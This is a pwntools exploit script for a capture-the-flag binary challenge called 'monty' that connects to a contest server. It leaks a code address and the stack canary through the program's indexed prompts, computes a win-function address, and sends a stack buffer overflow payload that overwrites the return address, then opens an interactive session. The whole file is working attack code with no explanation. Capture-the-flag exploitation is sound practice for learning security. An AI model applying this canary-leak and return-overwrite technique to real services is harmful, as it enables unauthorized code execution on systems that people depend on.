from pwn import *
from icecream import ic

exe = ELF("./monty_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31132)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# pie b 0x00000000000014a0
# pie b 0x00000000000015f6
pie b 0x0000000000001632
c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

ru("eek?")
sl(b"54")
ru("ek 1: ")
leak = int(rl().decode().strip())
win = leak + 0x139
ic(hex(leak))
ic(hex(win))

ru("eek?")
sl(b"55")
ru("ek 2: ")
canary = int(rl().decode().strip())
ic(hex(canary))

payload = b"b"*24
payload += p64(canary)
payload += b'b'*8
payload += p64(win)
ru("ady!")
sl(b"0")
ru("Name: ")
sl(payload)
i()
